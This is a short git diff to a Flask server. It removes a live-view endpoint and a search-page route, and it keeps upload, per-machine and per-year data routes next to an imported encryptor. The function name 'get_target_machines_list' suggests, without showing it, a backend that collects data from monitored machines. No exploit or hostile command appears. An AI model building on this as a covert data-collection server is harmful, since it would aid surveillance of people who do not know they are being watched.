@@ -4,7 +4,6 @@ from datetime import datetime
 from Enkryptor import Encryptor
 a = Encryptor()
 app = Flask(__name__)
-app.last_content = None
 text = ''
 
 
@@ -60,15 +59,13 @@ def upload():
 
     return jsonify({"status": "success", "file": file_path}), 200
 
-@app.route('/machine')
-def open_search():
-    return render_template('search_machine.html')
 
-@app.route("/api/live", methods=["GET"])
-def live_view():
-    if app.last_content is None:
-        return jsonify({"status": "no data yet"}), 200
-    return jsonify({"status": "success", "data": app.last_content}), 200
+
+# @app.route("/api/live", methods=["GET"])
+# def live_view():
+#     if app.last_content is None:
+#         return jsonify({"status": "no data yet"}), 200
+#     return jsonify({"status": "success", "data": app.last_content}), 200
 
 @app.route("/machines")
 def get_target_machines_list():
@@ -94,7 +91,7 @@ def get_years_list(machine):
     machine_folder = os.path.join(DATA_FOLDER, machine)
 
     if not os.path.exists(machine_folder):
-        # מחזירים JSON ולא מחרוזת
+            # מחזירים JSON ולא מחרוזת
         return jsonify({"error": "Machine not found"}), 404
 
     years = [year for year in os.listdir(machine_folder)]
